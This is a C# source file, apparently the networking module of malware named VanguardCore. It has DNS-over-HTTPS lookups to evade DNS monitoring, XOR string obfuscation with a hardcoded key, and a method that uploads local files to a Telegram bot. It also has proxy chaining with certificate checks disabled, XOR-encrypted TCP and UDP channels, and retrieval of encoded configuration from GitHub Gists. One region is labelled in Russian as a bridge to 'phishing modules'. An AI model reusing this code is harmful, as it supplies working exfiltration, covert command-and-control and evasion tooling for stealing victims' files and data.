using System;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace VanguardCore
{
    public class NetworkingManager
    {
        private static readonly string[] DoHEndpoints = {
            "https://1.1.1.1/dns-query",
            "https://dns.google/resolve"
        };

        private static byte[] _salt = Encoding.UTF8.GetBytes("n2xkNQYbZwj8r9fz");

        #region DNS-over-HTTPS (DoH)
        public static async Task<string> ResolveDoH(string hostname)
        {
            using (var client = new HttpClient())
            {
                client.DefaultRequestHeaders.Add("Accept", "application/dns-json");
                
                foreach (var endpoint in DoHEndpoints)
                {
                    try
                    {
                        string url = string.Format("{0}?name={1}&type=A", endpoint, hostname);
                        var response = await client.GetStringAsync(url);
                        
                        // Простой парсинг JSON (без внешних зависимостей)
                        if (response.Contains("\"data\":\""))
                        {
                            int start = response.IndexOf("\"data\":\"") + 8;
                            int end = response.IndexOf("\"", start);
                            string ip = response.Substring(start, end - start);
                            IPAddress dummy;
                            if (IPAddress.TryParse(ip, out dummy))
                                return ip;
                        }
                    }
                    catch { }
                }
            }
            return null;
        }
        #endregion

        #region XOR Obfuscation
        public static string XorString(string text)
        {
            byte[] data = Encoding.UTF8.GetBytes(text);
            for (int i = 0; i < data.Length; i++)
            {
                data[i] = (byte)(data[i] ^ _salt[i % _salt.Length]);
            }
            return Convert.ToBase64String(data);
        }

        public static string DexorString(string base64)
        {
            try
            {
                byte[] data = Convert.FromBase64String(base64);
                for (int i = 0; i < data.Length; i++)
                {
                    data[i] = (byte)(data[i] ^ _salt[i % _salt.Length]);
                }
                return Encoding.UTF8.GetString(data);
            }
            catch { return base64; }
        }
        #endregion

        #region Secure HTTP Client
        public static async Task<string> SecureGet(string url, string customHost = null)
        {
            try
            {
                Uri uri = new Uri(url);
                string ip = await ResolveDoH(uri.Host);
                
                string finalUrl = url;
                if (!string.IsNullOrEmpty(ip))
                {
                    finalUrl = url.Replace(uri.Host, ip);
                }

                using (var handler = new HttpClientHandler { UseProxy = false })
                using (var client = new HttpClient(handler))
                {
                    if (!string.IsNullOrEmpty(customHost))
                        client.DefaultRequestHeaders.Host = customHost;
                    else
                        client.DefaultRequestHeaders.Host = uri.Host;

                    client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                    
                    var response = await client.GetAsync(finalUrl);
                    if (response.IsSuccessStatusCode)
                    {
                        return await response.Content.ReadAsStringAsync();
                    }
                }
            }
            catch (Exception e) { return "Error: " + e.Message; }
            return null;
        }

        public static async Task<string> SecurePost(string url, string data, string content_type = "application/json")
        {
            try
            {
                Uri uri = new Uri(url);
                string ip = await ResolveDoH(uri.Host);
                
                string finalUrl = url;
                if (!string.IsNullOrEmpty(ip))
                {
                    finalUrl = url.Replace(uri.Host, ip);
                }

                using (var client = new HttpClient())
                {
                    client.DefaultRequestHeaders.Host = uri.Host;
                    var content = new StringContent(data, Encoding.UTF8, content_type);
                    var response = await client.PostAsync(finalUrl, content);
                    return await response.Content.ReadAsStringAsync();
                }
            }
            catch { return null; }
        }
        public static async Task<bool> SendFile(string botToken, string chatId, string filePath, string caption = "")
        {
            try
            {
                if (!File.Exists(filePath)) return false;
                
                string url = string.Format("https://api.telegram.org/bot{0}/sendDocument", botToken);
                string ip = await ResolveDoH("api.telegram.org");
                if (!string.IsNullOrEmpty(ip))
                {
                    url = url.Replace("api.telegram.org", ip);
                }

                using (var client = new HttpClient())
                {
                    client.DefaultRequestHeaders.Host = "api.telegram.org";
                    
                    using (var content = new MultipartFormDataContent())
                    {
                        content.Add(new StringContent(chatId), "chat_id");
                        content.Add(new StringContent(caption), "caption");
                        
                        var fileContent = new ByteArrayContent(File.ReadAllBytes(filePath));
                        content.Add(fileContent, "document", Path.GetFileName(filePath));
                        
                        var response = await client.PostAsync(url, content);
                        return response.IsSuccessStatusCode;
                    }
                }
            }
            catch { return false; }
        }
        #endregion

        #region Proxy Chaining
        /// <summary>
        /// Цепочка прокси (поддержка SOCKS5 и HTTP)
        /// </summary>
        public class ProxyChain
        {
            public List<string> Proxies { get; set; }
            private int _currentIndex = 0;
            
            public ProxyChain(params string[] proxies)
            {
                Proxies = new List<string>();
                Proxies.AddRange(proxies);
            }
            
            public async Task<string> GetViaChain(string url, int timeoutSeconds = 30)
            {
                for (int i = 0; i < Proxies.Count; i++)
                {
                    int idx = (_currentIndex + i) % Proxies.Count;
                    string proxy = Proxies[idx];
                    
                    try
                    {
                        string result = await SecureGetViaProxy(url, proxy, timeoutSeconds);
                        if (result != null)
                        {
                            _currentIndex = idx; 
                            return result;
                        }
                    }
                    catch { }
                }
                return null;
            }
            
            private async Task<string> SecureGetViaProxy(string url, string proxyUrl, int timeoutSeconds)
            {
                var handler = new HttpClientHandler();
                
                if (proxyUrl.StartsWith("socks5://"))
                {
                    var proxy = new WebProxy(proxyUrl.Replace("socks5://", "http://"));
                    handler.Proxy = proxy;
                }
                else if (proxyUrl.StartsWith("http"))
                {
                    handler.Proxy = new WebProxy(proxyUrl);
                }
                
                handler.UseProxy = true;
                handler.ServerCertificateCustomValidationCallback = (sender, cert, chain, sslErrors) => true;
                
                using (var client = new HttpClient(handler))
                {
                    client.Timeout = TimeSpan.FromSeconds(timeoutSeconds);
                    client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                    
                    var response = await client.GetAsync(url);
                    if (response.IsSuccessStatusCode)
                    {
                        return await response.Content.ReadAsStringAsync();
                    }
                }
                return null;
            }
        }
        #endregion

        #region XOR Sockets (Custom TCP with XOR obfuscation)
        /// <summary>
        /// TCP клиент с XOR шифрованием всех пакетов
        /// </summary>
        public class XorTcpClient : IDisposable
        {
            private TcpClient _tcp;
            private NetworkStream _stream;
            private byte[] _xorKey;
            private bool _disposed = false;
            
            public XorTcpClient(byte[] xorKey = null)
            {
                _xorKey = xorKey ?? Encoding.UTF8.GetBytes("n2xkNQYbZwj8r9fz");
                _tcp = new TcpClient();
            }
            
            public async Task ConnectAsync(string host, int port)
            {
                // Resolve DoH if needed
                string ip = await NetworkingManager.ResolveDoH(host);
                await _tcp.ConnectAsync(ip ?? host, port);
                _stream = _tcp.GetStream();
            }

            public async Task SendAsync(string data)
            {
                byte[] buffer = Encoding.UTF8.GetBytes(data);
                for (int i = 0; i < buffer.Length; i++)
                    buffer[i] = (byte)(buffer[i] ^ _xorKey[i % _xorKey.Length]);
                
                await _stream.WriteAsync(buffer, 0, buffer.Length);
            }

            public async Task<string> ReceiveAsync()
            {
                byte[] buffer = new byte[8192];
                int bytesRead = await _stream.ReadAsync(buffer, 0, buffer.Length);
                if (bytesRead == 0) return null;

                for (int i = 0; i < bytesRead; i++)
                    buffer[i] = (byte)(buffer[i] ^ _xorKey[i % _xorKey.Length]);

                return Encoding.UTF8.GetString(buffer, 0, bytesRead);
            }

            public void Dispose()
            {
                if (!_disposed)
                {
                    if (_stream != null) _stream.Dispose();
                    if (_tcp != null) _tcp.Close();
                    _disposed = true;
                }
            }
        }
        #endregion

        #region Gist Integration
        public static async Task<string> GetGistData(string gistId, string token = null)
        {
            try
            {
                string url = string.Format("https://api.github.com/gists/{0}", gistId);
                string response = await SecureGet(url, "api.github.com");
                
                if (!string.IsNullOrEmpty(response) && response.Contains("\"content\":\""))
                {
                    int start = response.IndexOf("\"content\":\"") + 11;
                    int end = response.IndexOf("\"", start);
                    string encrypted = response.Substring(start, end - start).Replace("\\n", "\n").Replace("\\\"", "\"");
                    return DexorString(encrypted);
                }
            }
            catch { }
            return null;
        }
        #endregion

        #region UDP Bridge (для связи с фишинг-модулями)
        public class UdpBridge : IDisposable
        {
            private UdpClient _udpServer;
            private int _port;
            private bool _running = true;
            private byte[] _xorKey;
            
            public event Action<string, string> OnMessageReceived; 
            
            public UdpBridge(int port, byte[] xorKey = null)
            {
                _port = port;
                _xorKey = xorKey ?? Encoding.UTF8.GetBytes("n2xkNQYbZwj8r9fz");
                _udpServer = new UdpClient(port);
            }
            
            public void Start()
            {
                Task.Run(async () => {
                    while (_running)
                    {
                        try
                        {
                            var result = await _udpServer.ReceiveAsync();
                            if (result.Buffer == null || result.Buffer.Length == 0)
                                continue;
                            
                            byte[] decrypted = new byte[result.Buffer.Length];
                            for (int i = 0; i < result.Buffer.Length; i++)
                                decrypted[i] = (byte)(result.Buffer[i] ^ _xorKey[i % _xorKey.Length]);
                            
                            string message = Encoding.UTF8.GetString(decrypted);
                            int separator = message.IndexOf('|');
                            if (separator > 0)
                            {
                                string module = message.Substring(0, separator);
                                string data = message.Substring(separator + 1);
                                if (OnMessageReceived != null) OnMessageReceived(module, data);
                            }
                        }
                        catch { }
                    }
                });
            }
            
            public void Stop()
            {
                _running = false;
                if (_udpServer != null) _udpServer.Close();
            }
            
            public void Dispose()
            {
                Stop();
                if (_udpServer != null) _udpServer.Dispose();
            }
        }
        
        public class UdpBridgeClient : IDisposable
        {
            private UdpClient _udpClient;
            private string _targetHost;
            private int _targetPort;
            private byte[] _xorKey;
            
            public UdpBridgeClient(string targetHost, int targetPort, byte[] xorKey = null)
            {
                _targetHost = targetHost;
                _targetPort = targetPort;
                _xorKey = xorKey ?? Encoding.UTF8.GetBytes("n2xkNQYbZwj8r9fz");
                _udpClient = new UdpClient();
            }
            
            public async Task SendAsync(string module, string data)
            {
                try
                {
                    string message = string.Format("{0}|{1}", module, data);
                    byte[] plain = Encoding.UTF8.GetBytes(message);
                    byte[] encrypted = new byte[plain.Length];
                    
                    for (int i = 0; i < plain.Length; i++)
                        encrypted[i] = (byte)(plain[i] ^ _xorKey[i % _xorKey.Length]);
                    
                    await _udpClient.SendAsync(encrypted, encrypted.Length, _targetHost, _targetPort);
                }
                catch { }
            }
            public void Dispose()
            {
                if (_udpClient != null) _udpClient.Close();
            }
        }
        #endregion
    }
}
